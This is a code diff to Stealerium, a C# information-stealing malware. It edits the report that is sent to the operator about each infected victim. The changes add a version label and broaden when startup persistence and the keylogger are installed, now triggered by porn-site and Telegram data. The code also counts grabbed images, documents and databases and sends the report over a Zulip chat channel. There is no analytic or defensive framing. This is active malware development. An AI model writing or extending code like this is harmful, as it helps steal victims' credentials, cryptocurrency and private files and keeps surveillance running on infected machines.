@@ -288,7 +288,7 @@ namespace Stealerium
 
             // Get system info as a report string
             var info = "```"
-                       + "\n😹 *Stealerium - Report:*"
+                       + "\n😹 *Stealerium v3.1.0 - Report:*"
                        + "\nDate: " + SystemInfo.Datenow
                        + "\nSystem: " + SystemInfo.GetSystemVersion()
                        + "\nUsername: " + SystemInfo.Username
@@ -348,17 +348,14 @@ namespace Stealerium
                        + Counter.GetSValue("🌃 Desktop screenshot", Counter.DesktopScreenshot)
                        + "\n"
                        + "\n🦠 *Installation:*"
-                       + Counter.GetBValue(Config.Autorun == "1" && (Counter.BankingServices || Counter.CryptoServices),
-                           "✅ Startup installed", "⛔️ Startup disabled")
-                       + Counter.GetBValue(
-                           Config.ClipperModule == "1" && Counter.CryptoServices && Config.Autorun == "1",
-                           "✅ Clipper installed", "⛔️ Clipper not installed")
-                       + Counter.GetBValue(
-                           Config.KeyloggerModule == "1" && Counter.BankingServices && Config.Autorun == "1",
-                           "✅ Keylogger installed", "⛔️ Keylogger not installed")
+                       + Counter.GetBValue(Config.Autorun == "1" && (Counter.BankingServices || Counter.CryptoServices || Counter.PornServices),
+                        "✅ Startup installed", "⛔️ Startup disabled")
+                       + Counter.GetBValue(Config.ClipperModule == "1" && Counter.CryptoServices && Config.Autorun == "1",
+                        "✅ Clipper installed", "⛔️ Clipper not installed")
+                       + Counter.GetBValue(Config.KeyloggerModule == "1" && (Counter.BankingServices || Counter.Telegram) && Config.Autorun == "1",
+                        "✅ Keylogger installed", "⛔️ Keylogger not installed")
                        + "\n"
-                       + "\n📄 *File Grabber:*" +
-                       (Config.GrabberModule != "1" ? "\n   ∟ ⛔️ Disabled in configuration" : "")
+                       + "\n📄 *File Grabber:*" + (Config.GrabberModule != "1" ? "\n   ∟ ⛔️ Disabled in configuration" : "")
                        + Counter.GetIValue("📂 Images", Counter.GrabberImages)
                        + Counter.GetIValue("📂 Documents", Counter.GrabberDocuments)
                        + Counter.GetIValue("📂 Database files", Counter.GrabberDatabases)
@@ -378,7 +375,6 @@ namespace Stealerium
             // Send the report to Zulip
             await SendZulipMessageAsync("Szurubooru", SystemInfo.Username, info).ConfigureAwait(false);
         }
-
 
         /// <summary>
         /// Send report asynchronously to Telegram
